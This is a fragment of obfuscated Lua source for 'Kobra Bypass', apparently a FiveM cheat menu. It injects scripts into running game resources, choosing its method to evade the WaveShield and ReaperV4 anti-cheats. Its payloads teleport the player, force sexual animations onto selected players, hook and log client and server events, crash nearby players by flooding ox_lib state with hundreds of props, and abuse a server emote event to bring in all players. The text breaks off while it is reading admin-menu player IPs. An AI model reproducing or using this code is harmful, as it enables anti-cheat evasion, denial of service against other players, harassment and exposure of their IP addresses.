                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v36(v439,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end break;end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v440) if v440 then v0:Notify("success","Kobra","Unlimited Fuel On",3000);v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);else local v580=0;while true do if (v580==0) then v0:Notify("error","Kobra","Unlimited Fuel Off",3000);v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v441=584 -(531 + 53) ;while true do if (v441==(0 + 0)) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v442={};for v518,v519 in pairs(v15) do if v519 then v442[ #v442 + 1 + 0 ]=v518;end end if ( #v442==0) then local v581=0 + 0 ;while true do if (v581==0) then v249:Notify("error","Kobra","You must select a player first!",3000);return;end end end for v520,v521 in ipairs(v442) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v521,v521));end v249:Notify("success","Kobra","Attempted to twerk on "   ..  #v442   .. " player(s)." ,4000);end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v443={};for v522,v523 in pairs(v15) do if v523 then v443[ #v443 + (1 -0) ]=v522;end end if ( #v443==(0 + 0)) then v249:Notify("error","Kobra","You must select a player first!",3000);return;end for v524,v525 in ipairs(v443) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v525,v525));end v249:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v443   .. " player(s)." ,3403 + 597 );end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v444=0;local v445;local v446;while true do if (v444==0) then v445=GetResourceState("WaveShield")=="started" ;v446=GetResourceState("ReaperV4")=="started" ;v444=1 -0 ;end if (v444==(1 + 0)) then if v445 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v446 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end end end},{type="button",label="Mission Row PD",onSelect=function() local v447=0 -0 ;local v448;local v449;while true do if (v447==(0 -0)) then v448=GetResourceState("WaveShield")=="started" ;v449=GetResourceState("ReaperV4")=="started" ;v447=1 -0 ;end if ((3 -2)==v447) then if v448 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v449 then MachoInjectThread(0 -0 ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v450=0;local v451;local v452;while true do if (0==v450) then v451=GetResourceState("WaveShield")=="started" ;v452=GetResourceState("ReaperV4")=="started" ;v450=1 + 0 ;end if (v450==(1 + 0)) then if v451 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v452 then MachoInjectThread(462 -(428 + 34) ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end break;end end end},{type="button",label="Grove Street",onSelect=function() local v453=0 -0 ;local v454;local v455;while true do if (v453==(2 -1)) then if v454 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v455 then MachoInjectThread(0 -0 ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end break;end if (v453==(918 -(223 + 695))) then v454=GetResourceState("WaveShield")=="started" ;v455=GetResourceState("ReaperV4")=="started" ;v453=3 -2 ;end end end},{type="button",label="Legion Square",onSelect=function() local v456=GetResourceState("WaveShield")=="started" ;local v457=GetResourceState("ReaperV4")=="started" ;if v456 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v457 then MachoInjectThread(0 + 0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v47("Choose Menu Key","",function(v526) for v582,v583 in pairs(v32) do if (v583:lower()==v526:lower()) then v11=v583;Wait(532 -282 );v0:ShowUI();return;end end end,"keybind");end}}},{type="subMenu",label="Banners",subTabs={{icon="",type="button",label="Red Banner (Default)",onSelect=function() v0:SendMessage({action="updateBanner",bannerColor="150, 0, 0",bannerLink="https://r2.fivemanage.com/j0YlVJ9wWJTFeImwfmRK2/KobraBypassBanner.png"});end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1 -0 ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=338 -(8 + 329) ,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v5=v4;v6=nil;v7=1 -0 ;v3=1;end;local function v84(v250) for v458,v459 in ipairs(v4) do if (v459.label=="Server") then for v682,v683 in ipairs(v459.categories) do if (v683.label=="Triggers") then local v810=0 + 0 ;while true do if (v810==(0 -0)) then v683.tabs[ #v683.tabs + 1 ]=v250;return;end end end end end end end v0.UpdateTabChecked=function(v251,v252,v253,v254) for v460,v461 in pairs(v252 or {} ) do if ((v461.label==v253) and ((v461.type=="checkbox") or (v461.type=="slider-checkbox") or v461.type:find("checkbox"))) then v461.checked=v254;elseif (v461.type=="subMenu") then local v765=0 -0 ;while true do if (0==v765) then if v461.categories then for v1089,v1090 in pairs(v461.categories) do v251:UpdateTabChecked(v1090.tabs,v253,v254);end end if v461.subTabs then v251:UpdateTabChecked(v461.subTabs,v253,v254);end break;end end end end end;v0.ShowKeybindList=function(v255,v256) v255:SendMessage({action="displayBinds",visible=true,binds=v256});end;v0.HideKeybindList=function(v257) v257:SendMessage({action="displayBinds",visible=false});end;v0.GetNearbyPlayers=function(v258,v259,v260,v261) local v262=0;local v263;local v264;local v265;while true do if (v262==(3 -2)) then v260=v260 or (738 -388) ;if ( not v264 or  not DoesEntityExist(v264) or  not IsPlayerPlaying(PlayerId())) then v263={};return v263;end v262=1 + 1 ;end if (v262==(1503 -(957 + 546))) then v263={};v264=PlayerPedId();v262=4 -3 ;end if ((2 + 1)==v262) then if ( #v263==(0 + 0)) then v263={};end return v263;end if (v262==(1 + 1)) then v265=GetActivePlayers();if v265 then for v811,v812 in ipairs(v265) do if (v261 or (v812~=PlayerId())) then local v963=0 + 0 ;local v964;while true do if (v963==0) then v964=GetPlayerPed(v812);if (v964 and DoesEntityExist(v964) and IsEntityAPed(v964) and  not IsEntityDead(v964)) then local v1256=0;local v1257;while true do if ((703 -(227 + 476))==v1256) then v1257=GetEntityCoords(v964);if v1257 then local v1510= #(v259-v1257);if (v1510<=v260) then v263[ #v263 + (1 -0) ]={name=GetPlayerName(v812),serverId=GetPlayerServerId(v812)};end end break;end end end break;end end end end else local v766=0 -0 ;local v767;local v768;local v769;while true do if (v766==1) then repeat local v1003=0;while true do if (v1003==(0 -0)) then if (v768 and IsPedAPlayer(v768) and DoesEntityExist(v768)) then local v1304=0;local v1305;while true do if ((0 -0)==v1304) then v1305=NetworkGetPlayerIndexFromPed(v768);if ((v1305~= -(1 -0)) and (v261 or (v1305~=PlayerId()))) then local v1534=0;local v1535;while true do if (v1534==(954 -(166 + 788))) then v1535=GetEntityCoords(v768);if v1535 then local v1698=0;local v1699;while true do if (v1698==(986 -(21 + 965))) then v1699= #(v259-v1535);if (v1699<=v260) then v263[ #v263 + 1 ]={name=GetPlayerName(v1305),serverId=GetPlayerServerId(v1305)};end break;end end end break;end end end break;end end end v769,v768=FindNextPed(v767);break;end end until  not v769 EndFindPed(v767);break;end if (v766==(696 -(127 + 569))) then v767,v768=FindFirstPed();v769=nil;v766=1 + 0 ;end end end v262=1 + 2 ;end end end;CreateThread(function() v0:Initialize();v0:BuildDefaultMenu();v0:UpdateElements(v5);Wait(1000);v0:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",1084 + 1916 );Wait(1000);v0:Notify("info","Kobra","Your key will never expire, thanks for using Kobra Bypass!",4357 -1357 );Wait(648 + 352 );if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v84({type="button",label="Deobfuscate Events",onSelect=function() local v585=0 -0 ;local v586;local v587;local v588;while true do if (v585==0) then v0:HideUI();v586=nil;v587=false;v47("Resource Name","",function(v855) local v856=0;while true do if (v856==(0 + 0)) then if (v855 and (v855~="")) then v586=v855;end v587=true;break;end end end,"typeable");v585=1;end if (v585==2) then v36(v586,v588);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v586   .. "^7 successfully!" );v0:ShowUI();break;end if (v585==1) then while  not v587 do Wait(100);end if ( not v586 or (v586=="")) then local v965=0;while true do if (v965==1) then return;end if (v965==(0 + 0)) then MachoMenuNotification("Error","No resource name entered.");v0:ShowUI();v965=1;end end end if (GetResourceState(v586)~="started") then MachoMenuNotification("Error","Resource ^3"   .. v586   .. "^7 is not started or doesn’t exist." );v0:ShowUI();return;end v588=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v585=1294 -(1162 + 130) ;end end end});end if (GetResourceState("ox_lib")=="started") then v84({type="button",label="Crash Nearby Players",onSelect=function() local v589=0;while true do if (v589==(0 -0)) then if (GetResourceState("WaveShield")=="started") then local v966=0 + 0 ;while true do if (v966==(0 -0)) then v0:Notify("error","Kobra","Ban Prevention: Cannot Use this on WaveShield",3000);return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v84({type="button",label="Bring All Nearby Players",onSelect=function() v0:Notify("success","Kobra","Attempting to bring all players",3000);MachoInjectThread(936 -(889 + 47) ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);end});end if (GetResourceState("mc9-adminmenu")=="started") then v84({type="button",label="Admin Menu List (F8)",onSelect=function() local v590=0 + 0 ;while true do if (v590==(1264 -(1153 + 111))) then v0:Notify("success","Kobra","Admin Menu List",3956 -956 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
